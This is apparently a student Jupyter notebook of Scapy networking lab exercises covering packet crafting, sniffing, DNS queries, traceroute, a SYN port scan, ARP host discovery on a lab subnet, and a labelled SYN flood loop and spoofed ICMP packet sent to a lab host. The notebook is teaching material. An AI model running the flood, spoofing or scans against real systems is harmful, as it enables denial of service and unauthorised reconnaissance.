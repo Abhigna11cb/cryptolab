{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0e0c36e9-6f35-4be1-8b0b-f6c3bc7c1812",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Defaulting to user installation because normal site-packages is not writeable\n",
      "Requirement already satisfied: scapy in c:\\users\\student\\appdata\\roaming\\python\\python311\\site-packages (2.5.0)\n"
     ]
    }
   ],
   "source": [
    "!pip install scapy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "62327922-6289-47af-b7cd-e3a702ce580c",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Wireshark is installed, but cannot read manuf !\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "da7f872b-5f8b-420d-8292-53de2817343e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Ether  type=IPv4 |<IP  |>>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "packet=IP()/TCP()\n",
    "Ether()/IP()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "eedce4c8-7ee3-408a-ad48-9baa0b5e42d9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:0 UDP:2 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "packet=sniff(count=2)\n",
    "packet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "0010d19d-5e93-480c-8dc4-28bdf412684b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Ether  dst=01:00:5e:7f:ff:fa src=cc:96:e5:3c:4e:78 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=203 id=34493 flags= frag=0 ttl=1 proto=udp chksum=0x7c50 src=192.168.5.114 dst=239.255.255.250 |<UDP  sport=63317 dport=ssdp len=183 chksum=0xc709 |<Raw  load='M-SEARCH * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nMAN: \"ssdp:discover\"\\r\\nMX: 1\\r\\nST: urn:dial-multiscreen-org:service:dial:1\\r\\nUSER-AGENT: Microsoft Edge/126.0.2592.61 Windows\\r\\n\\r\\n' |>>>>"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mypackets=packet[0]\n",
    "mypackets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "7e7c5e7b-ae32-4ffb-9412-6655d26779ee",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc:96:e5:3c:4e:78\n"
     ]
    }
   ],
   "source": [
    "def print_source_ethernet(frame):\n",
    "    print(frame[Ether].src)\n",
    "print_source_ethernet(mypackets)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "56f8e5a3-5c54-42a4-8282-dfd757b6689e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc:96:e5:3c:1a:17\n",
      "cc:96:e5:3d:f4:6b\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:0 UDP:1 ICMP:0 Other:1>"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sniff(count=2,prn=print_source_ethernet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "1566a55c-3dd8-400c-ac40-02ed26a3add7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ether / IP / UDP 192.168.5.114:63317 > 239.255.255.250:ssdp / Raw\n",
      "Ether / IPv6 / UDP / DNS Qry \"b'DP3660M104SYS-55._dosvc._tcp.local.'\" \n"
     ]
    }
   ],
   "source": [
    "packet.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "2da7ccb6-ee74-4f0a-9677-978ea2f37a9a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "01:00:5e:7f:ff:fa\n"
     ]
    }
   ],
   "source": [
    "def print_dest_ethernet(frame):\n",
    "    print(frame[Ether].dst)\n",
    "print_dest_ethernet(mypackets)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "19a61976-5730-4b2a-a42f-de9f69be7e7d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "3c:33:32:cd:e9:4b\n",
      "cc:96:e5:3c:5b:f8\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:2 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sniff(count=2,prn=print_dest_ethernet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "6712174c-45af-439a-9daa-bdb4e466d211",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ether / IP / UDP 192.168.5.114:63317 > 239.255.255.250:ssdp / Raw\n",
      "Ether / IPv6 / UDP / DNS Qry \"b'DP3660M104SYS-55._dosvc._tcp.local.'\" \n"
     ]
    }
   ],
   "source": [
    "packet.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "135b1488-070f-4e42-8b5a-a3469a18812a",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.layers.inet import IP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "a9e358e5-d37a-4e5f-9640-f78e633704a6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc:96:e5:3c:4e:78\n"
     ]
    }
   ],
   "source": [
    "def print_source_ethernet(frame):\n",
    "    print(frame[Ether].src)\n",
    "print_source_ethernet(mypackets)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "ed46307b-bada-4961-af13-920f3eea3ad4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Source Ethernet Address: 3c:33:32:cd:e9:4b\n",
      "Source Ethernet Address: cc:96:e5:3c:5b:f8\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:2 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sniff(filter='ip',count=2,prn=print_source_ethernet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "280ca19b-da50-46f1-83e8-7f89b126207e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Source Ethernet Address: cc:96:e5:3d:f3:f6\n",
      "Source Ethernet Address: cc:96:e5:3d:f3:f6\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:0 UDP:2 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from scapy.all import sniff, Ether\n",
    "def print_source_ethernet(packet):\n",
    "    if Ether in packet:\n",
    "        print(f\"Source Ethernet Address: {packet[Ether].src}\")\n",
    "sniff(filter='ip', count=2, prn=print_source_ethernet)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a55b2ed5-8b9b-4bdb-ac33-e9fdd545a2af",
   "metadata": {},
   "outputs": [],
   "source": [
    "17/03/2025"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0ea33f7a-badb-43cd-98f0-0d6c516d3b66",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Wireshark is installed, but cannot read manuf !\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'IP / TCP 127.0.0.1:ftp_data > 127.0.0.1:http S'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "packet=IP()/TCP()\n",
    "packet.summary()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "faf40791-bb32-4cde-abce-f095b185e1da",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Ether / IP / TCP 127.0.0.1:ftp_data > 127.0.0.1:http S'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "packet=IP()/TCP()\n",
    "packets=Ether()/packet #adding another layer \n",
    "packets.summary()\n",
    "\n",
    "#2 Data Link Layer-> ETHER \n",
    "#3 Network layer->IP,IPv6,ARP\n",
    "#4 Transport->TCP,UDP,ICMP\n",
    "#5-7 Application Layer->Raw,DNS,HTTP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "ebd94bfa-8e83-4f10-81c0-ec3c0b8c3863",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Wireshark is installed, but cannot read manuf !\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ IP ]### \n",
      "  version   = 4\n",
      "  ihl       = None\n",
      "  tos       = 0x0\n",
      "  len       = None\n",
      "  id        = 1\n",
      "  flags     = \n",
      "  frag      = 0\n",
      "  ttl       = 64\n",
      "  proto     = tcp\n",
      "  chksum    = None\n",
      "  src       = 127.0.0.1\n",
      "  dst       = 127.0.0.1\n",
      "  \\options   \\\n",
      "###[ TCP ]### \n",
      "     sport     = ftp_data\n",
      "     dport     = http\n",
      "     seq       = 0\n",
      "     ack       = 0\n",
      "     dataofs   = None\n",
      "     reserved  = 0\n",
      "     flags     = S\n",
      "     window    = 8192\n",
      "     chksum    = None\n",
      "     urgptr    = 0\n",
      "     options   = ''\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "packet=IP()/TCP()\n",
    "packet.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "afe26003-3a7f-4a47-956a-71baf32ea1b6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Sent 1 packets.\n"
     ]
    }
   ],
   "source": [
    "packet =IP(dst=\"8.8.8.8\")/ICMP()#google's default DNS server\n",
    "send(packet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "f9f24681-b0fe-4680-99a7-ec74d809da60",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ether / IP / UDP / DNS Ans \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IPv6 / UDP / DNS Ans \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IP / UDP / DNS Qry \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IPv6 / UDP / DNS Qry \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IP / UDP / DNS Qry \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IPv6 / UDP / DNS Qry \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IP / UDP / DNS Qry \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IPv6 / UDP / DNS Qry \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IP / UDP / DNS Ans \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n",
      "Ether / IPv6 / UDP / DNS Ans \"b'DP3660M104SYS-53._dosvc._tcp.local.'\" \n"
     ]
    }
   ],
   "source": [
    "#Capture 10 packets from the network interface .The sniff() function listens for incoming packets and store them in a list . count=10 measn it will stop \n",
    "#capturing after recieving 10 packets\n",
    "packets=sniff(count=10)\n",
    "packets.summary()\n",
    "#print a summary of all the capture packets .The summary() provides a quick "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "60ee27ed-31f2-48ab-b53e-20c43f91f4a1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Port 443 is open.\n"
     ]
    }
   ],
   "source": [
    "#Target ip address to be scanned \n",
    "target_ip=\"8.8.8.8\"\n",
    "#List of ports to scan to check which are all up and running \n",
    "ports=[22,80,443]\n",
    "#Perform a SYN scan on ecah port in the list\n",
    "for port in ports:\n",
    "    #Create a TCP SYN packet . IP(dest=tagret_ip)-> Setsthe dest IP addr. TCP(dport=port,flags=\"S\")-> Sets the dest port and SYN flag (\"S\" for SYN)\n",
    "    packet=IP(dst=target_ip) /TCP(dport =port,flags=\"S\")\n",
    "    #Send the packet and wait for a single response(srl). timeout1->wait for 1 second before assuming no response .\n",
    "    #verbos=0->Supresses unnecessary output\n",
    "    #sr() Sends a packet and returns all replies \n",
    "    #sr1() Sends a packet and returns the first reply\n",
    "    response=sr1(packet,timeout=1,verbose=0)\n",
    "\n",
    "    #If a response is recieved ,check the TCP flags to determine poty status\n",
    "    if response:\n",
    "        #If the TCP flags indicate SYN-SCK (\"SA\"), the port is open\n",
    "        if response[TCP].flags==\"SA\":\n",
    "            print(f\"Port {port} is open.\")\n",
    "        #If teh Tcp flags indicate RST-ACK (\"RA\") ,the port is closed \n",
    "        elif response[TCP].flags==\"RA\":\n",
    "            print(f\"Port {port} is closed.\")\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "72ff61bb-96c8-482f-b2a3-b3820156b572",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "\n",
      "Received 4 packets, got 1 answers, remaining 0 packets\n",
      "DNS Ans \"b'www.example.com-v4.edgesuite.net.'\" \n"
     ]
    }
   ],
   "source": [
    "#Program to give alias name \n",
    "#Create a DNS query packet to resolve the IP address of \"www.example.com\"\n",
    "packet=IP(dst=\"8.8.8.8\")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=\"www.example.com\"))#\n",
    "#This creates a custom DNS query packet using Scapy\n",
    "#It consists of 3 main protocols layers:IP , \n",
    "\n",
    "response=sr1(packet)\n",
    "\n",
    "response[DNS].summary()\n",
    "print(response[DNS].summary())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26269018-a116-4801-8819-034c89787349",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Wireshark is installed, but cannot read manuf !\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.83\n",
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.83\n",
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.83\n",
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.83\n",
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.197\n",
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.197\n",
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.197\n",
      "ICMP packet from 192.168.5.9\n",
      "ICMP packet from 49.44.113.197\n"
     ]
    }
   ],
   "source": [
    "#Define callback function to process packets captured by sniff()\n",
    "from scapy.all import*\n",
    "def callback(packet):\n",
    "    #Check if the packet contains an IP layer and its protocol is ICMP\n",
    "    if packet[IP].proto==1:#ICMP Protocol\n",
    "        #Print the src IP address of ICMP packets\n",
    "        print(f\"ICMP packet from {packet[IP].src}\")\n",
    "sniff(prn=callback,filter=\"icmp\",store=0)\n",
    "##Run ping command on cmd prompt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4376919-f498-4fed-8503-52f550290327",
   "metadata": {},
   "outputs": [],
   "source": [
    "24/3/25"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "9f9c24a3-1ed0-4f01-a5fb-da3441722050",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Host Up:192.168.5.1MAC:3c:33:32:cd:e9:4b\n",
      "Host Up:192.168.5.2MAC:cc:96:e5:3d:f2:18\n",
      "Host Up:192.168.5.3MAC:cc:96:e5:3c:56:62\n",
      "Host Up:192.168.5.4MAC:cc:96:e5:3d:f4:63\n",
      "Host Up:192.168.5.5MAC:cc:96:e5:3d:ee:23\n",
      "Host Up:192.168.5.6MAC:cc:96:e5:3c:5b:f8\n",
      "Host Up:192.168.5.7MAC:cc:96:e5:3c:1a:17\n",
      "Host Up:192.168.5.8MAC:cc:96:e5:3d:f2:0d\n",
      "Host Up:192.168.5.9MAC:cc:96:e5:3c:57:d5\n",
      "Host Up:192.168.5.10MAC:cc:96:e5:3d:f2:4c\n",
      "Host Up:192.168.5.11MAC:cc:96:e5:3c:20:f4\n",
      "Host Up:192.168.5.13MAC:cc:96:e5:3d:f2:00\n",
      "Host Up:192.168.5.14MAC:cc:96:e5:3d:f7:14\n",
      "Host Up:192.168.5.12MAC:cc:96:e5:3d:f3:87\n",
      "Host Up:192.168.5.15MAC:cc:96:e5:3d:f4:6b\n",
      "Host Up:192.168.5.17MAC:cc:96:e5:3d:f3:56\n",
      "Host Up:192.168.5.18MAC:cc:96:e5:3d:f4:59\n",
      "Host Up:192.168.5.19MAC:cc:96:e5:3d:f3:f6\n",
      "Host Up:192.168.5.21MAC:cc:96:e5:3d:f3:cb\n",
      "Host Up:192.168.5.24MAC:cc:96:e5:3d:f6:26\n",
      "Host Up:192.168.5.25MAC:cc:96:e5:3d:f7:2b\n",
      "Host Up:192.168.5.27MAC:cc:96:e5:3d:f2:96\n",
      "Host Up:192.168.5.33MAC:cc:96:e5:3c:4e:c5\n",
      "Host Up:192.168.5.34MAC:cc:96:e5:3d:f5:65\n",
      "Host Up:192.168.5.36MAC:cc:96:e5:3c:58:ee\n",
      "Host Up:192.168.5.37MAC:cc:96:e5:3d:f6:b0\n",
      "Host Up:192.168.5.39MAC:cc:96:e5:3d:f5:7d\n",
      "Host Up:192.168.5.40MAC:cc:96:e5:3d:ee:46\n",
      "Host Up:192.168.5.41MAC:cc:96:e5:3c:21:6e\n",
      "Host Up:192.168.5.42MAC:cc:96:e5:3d:f2:6b\n",
      "Host Up:192.168.5.43MAC:cc:96:e5:3d:f5:eb\n",
      "Host Up:192.168.5.44MAC:cc:96:e5:3d:f3:73\n",
      "Host Up:192.168.5.45MAC:cc:96:e5:3d:f2:5a\n",
      "Host Up:192.168.5.46MAC:cc:96:e5:3d:f3:45\n",
      "Host Up:192.168.5.50MAC:08:00:27:f9:78:55\n",
      "Host Up:192.168.5.51MAC:cc:96:e5:3d:f5:82\n",
      "Host Up:192.168.5.54MAC:cc:96:e5:3d:f6:1d\n",
      "Host Up:192.168.5.56MAC:cc:96:e5:3d:f6:04\n",
      "Host Up:192.168.5.61MAC:cc:96:e5:3d:ee:5c\n",
      "Host Up:192.168.5.62MAC:cc:96:e5:3d:f4:c2\n",
      "Host Up:192.168.5.68MAC:cc:96:e5:3d:f2:28\n",
      "Host Up:192.168.5.74MAC:cc:96:e5:3d:f6:a1\n",
      "Host Up:192.168.5.80MAC:cc:96:e5:3c:29:0b\n",
      "Host Up:192.168.5.94MAC:cc:96:e5:3d:f7:41\n",
      "Host Up:192.168.5.97MAC:cc:96:e5:3d:f2:62\n",
      "Host Up:192.168.5.114MAC:cc:96:e5:3c:4e:78\n",
      "Host Up:192.168.5.117MAC:08:00:27:d6:a3:d4\n",
      "Host Up:192.168.5.120MAC:cc:96:e5:3c:20:b8\n",
      "Host Up:192.168.5.157MAC:08:00:27:8f:35:10\n",
      "Host Up:192.168.5.160MAC:cc:96:e5:3d:f4:73\n",
      "Host Up:192.168.5.179MAC:08:00:27:22:87:73\n",
      "Host Up:192.168.5.202MAC:78:45:c4:10:ab:27\n",
      "Host Up:192.168.5.220MAC:a4:14:37:a6:a4:bf\n",
      "Host Up:192.168.5.221MAC:28:57:be:8c:04:c2\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "#Define the target subnet\n",
    "target_subnet=\"192.168.5.0/24\"\n",
    "#Send ARP requests\n",
    "answered,unanswered=srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=target_subnet),timeout=2,verbose=False)\n",
    "for sent,recieved in answered:\n",
    "    print(f\"Host Up:{recieved.psrc}MAC:{recieved.hwsrc}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "563086a0-1945-4472-bf16-f878d5f02dd6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Begin emission:\n",
      "Finished sending 4 packets.\n",
      "\n",
      "Received 4 packets, got 4 answers, remaining 0 packets\n",
      "  142.250.195.196:tcp80 23.223.47.65:tcp80 \n",
      "1 192.168.5.1     11    192.168.5.1     11 \n",
      "2 1.7.240.192     11    1.7.240.192     11 \n",
      "  142.250.195.196:tcp80 23.223.47.65:tcp80 \n",
      "1 192.168.5.1     11    192.168.5.1     11 \n",
      "2 1.7.240.192     11    1.7.240.192     11 \n"
     ]
    }
   ],
   "source": [
    "#traceroute is a common network diagnostic tool for displaying the route and measuring transit delays of packets across an IP netweok \n",
    "result,_=traceroute([\"www.example.com\",\"www.google.com\"],maxttl=2)\n",
    "result.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "bc7eb4de-61cd-4026-bcc4-0038ce3debb7",
   "metadata": {},
   "outputs": [],
   "source": [
    "#SYN Flood Attack\n",
    "#SYN flood is a form of denial-of-service attack in which an attacker sends a succesion of SYN requests to a traget's system in an attempt to consume enough derver resources to make the system unresponsive to legitimate traffic.\n",
    "\n",
    "target_ip=\"192.168.5.17\"\n",
    "target_port=80\n",
    "\n",
    "for i in range(1000):\n",
    "    send(IP(dst=target_ip)/TCP(dport=target_port,flags='S'),verbose=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "43b42a09-8e46-4a4b-8ca3-a4367cf38efe",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Begin emission:\n",
      "Finished sending 256 packets.\n",
      "\n",
      "Received 636 packets, got 65 answers, remaining 191 packets\n",
      "192.168.5.1 3c:33:32:cd:e9:4b\n",
      "192.168.5.2 cc:96:e5:3d:f2:18\n",
      "192.168.5.3 cc:96:e5:3c:56:62\n",
      "192.168.5.4 cc:96:e5:3d:f4:63\n",
      "192.168.5.5 cc:96:e5:3d:ee:23\n",
      "192.168.5.6 cc:96:e5:3c:5b:f8\n",
      "192.168.5.8 cc:96:e5:3d:f2:0d\n",
      "192.168.5.9 cc:96:e5:3c:57:d5\n",
      "192.168.5.10 cc:96:e5:3d:f2:4c\n",
      "192.168.5.11 cc:96:e5:3c:20:f4\n",
      "192.168.5.12 cc:96:e5:3d:f3:87\n",
      "192.168.5.13 cc:96:e5:3d:f2:00\n",
      "192.168.5.14 cc:96:e5:3d:f7:14\n",
      "192.168.5.15 cc:96:e5:3d:f4:6b\n",
      "192.168.5.17 cc:96:e5:3d:f3:56\n",
      "192.168.5.18 cc:96:e5:3d:f4:59\n",
      "192.168.5.19 cc:96:e5:3d:f3:f6\n",
      "192.168.5.20 cc:96:e5:3d:ee:88\n",
      "192.168.5.21 cc:96:e5:3d:f3:cb\n",
      "192.168.5.22 cc:96:e5:3d:f5:f5\n",
      "192.168.5.23 cc:96:e5:3d:f3:60\n",
      "192.168.5.24 cc:96:e5:3d:f6:26\n",
      "192.168.5.25 cc:96:e5:3d:f7:2b\n",
      "192.168.5.27 cc:96:e5:3d:f2:96\n",
      "192.168.5.31 cc:96:e5:3c:18:c3\n",
      "192.168.5.33 cc:96:e5:3c:4e:c5\n",
      "192.168.5.34 cc:96:e5:3d:f5:65\n",
      "192.168.5.36 cc:96:e5:3c:58:ee\n",
      "192.168.5.37 cc:96:e5:3d:f6:b0\n",
      "192.168.5.39 cc:96:e5:3d:f5:7d\n",
      "192.168.5.40 cc:96:e5:3d:ee:46\n",
      "192.168.5.41 cc:96:e5:3c:21:6e\n",
      "192.168.5.42 cc:96:e5:3d:f2:6b\n",
      "192.168.5.43 cc:96:e5:3d:f5:eb\n",
      "192.168.5.44 cc:96:e5:3d:f3:73\n",
      "192.168.5.45 cc:96:e5:3d:f2:5a\n",
      "192.168.5.46 cc:96:e5:3d:f3:45\n",
      "192.168.5.51 cc:96:e5:3d:f5:82\n",
      "192.168.5.54 cc:96:e5:3d:f6:1d\n",
      "192.168.5.56 cc:96:e5:3d:f6:04\n",
      "192.168.5.57 cc:96:e5:3c:21:fe\n",
      "192.168.5.61 cc:96:e5:3d:ee:5c\n",
      "192.168.5.62 cc:96:e5:3d:f4:c2\n",
      "192.168.5.68 cc:96:e5:3d:f2:28\n",
      "192.168.5.69 cc:96:e5:3d:f1:f1\n",
      "192.168.5.74 cc:96:e5:3d:f6:a1\n",
      "192.168.5.80 cc:96:e5:3c:29:0b\n",
      "192.168.5.93 08:00:27:fa:a2:28\n",
      "192.168.5.94 cc:96:e5:3d:f7:41\n",
      "192.168.5.97 cc:96:e5:3d:f2:62\n",
      "192.168.5.98 08:00:27:1b:21:32\n",
      "192.168.5.104 08:00:27:74:a1:e8\n",
      "192.168.5.106 cc:96:e5:3c:24:4a\n",
      "192.168.5.112 cc:96:e5:3d:f3:29\n",
      "192.168.5.114 cc:96:e5:3c:4e:78\n",
      "192.168.5.118 08:00:27:2d:e0:79\n",
      "192.168.5.120 cc:96:e5:3c:20:b8\n",
      "192.168.5.157 08:00:27:8f:35:10\n",
      "192.168.5.160 cc:96:e5:3d:f4:73\n",
      "192.168.5.162 08:00:27:ed:b1:b8\n",
      "192.168.5.7 cc:96:e5:3c:1a:17\n",
      "192.168.5.179 08:00:27:22:87:73\n",
      "192.168.5.202 78:45:c4:10:ab:27\n",
      "192.168.5.220 a4:14:37:a6:a4:bf\n",
      "192.168.5.221 28:57:be:8c:04:c2\n"
     ]
    }
   ],
   "source": [
    "import scapy.all as scapy\n",
    "request=scapy.ARP()\n",
    "request.pdst='192.168.5.6/24'#source addr/prefix length->CIDR notation\n",
    "broadcast=scapy.Ether()\n",
    "broadcast.dst='ff:ff:ff:ff:ff:ff'\n",
    "request_broadcast=broadcast/request\n",
    "clients=scapy.srp(request_broadcast,timeout=1)[0]\n",
    "for element in clients:\n",
    "    print(element[1].psrc+\" \"+element[1].hwsrc)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "da480978-005b-49f1-8a0b-ad46ebb602bd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Sent 1 packets.\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import*\n",
    "#Craft a spoofed IP packet\n",
    "spoofed_packet=IP(src=\"192.168.5.6\",dst=\"192.168.5.17\")/ICMP()/\"Hello,world!\"\n",
    "send(spoofed_packet)\n",
    "#Caputer packets in Wireshark and run this cell.Then apply filter ICMP "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1f92418c-3cfe-4f94-93d8-0eb6066e51f6",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
